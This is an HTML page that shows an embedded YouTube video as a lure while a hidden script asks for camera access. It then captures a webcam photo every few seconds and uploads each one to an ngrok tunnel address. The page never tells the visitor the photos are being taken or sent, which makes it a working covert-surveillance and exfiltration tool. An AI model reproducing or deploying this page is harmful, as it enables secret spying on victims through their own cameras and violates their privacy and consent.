<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture and Upload Photo</title>
</head>
<body>
    <iframe width="560" height="315" src="https://www.youtube.com/embed/jLRuAdw7FvU?si=q0h4Le8HwmTH6bkQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
    <script>
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        // Access the device camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Capture photo every 10 seconds
                setInterval(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    canvas.toBlob((blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'photo.jpg');

                        // Send the photo to the server
                        fetch('https://c4dd-150-242-65-3.ngrok-free.app/upload', {  // replace url
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.text())
                        .then(data => {
                            console.log(data); // Log success message
                        })
                        .catch(error => {
                            console.error('Error uploading photo:', error);
                        });
                    }, 'image/jpeg');
                }, 5000); // 10 seconds
            })
            .catch((err) => {
                console.error("Error accessing camera: ", err);
            });
    </script>
</body>
</html>
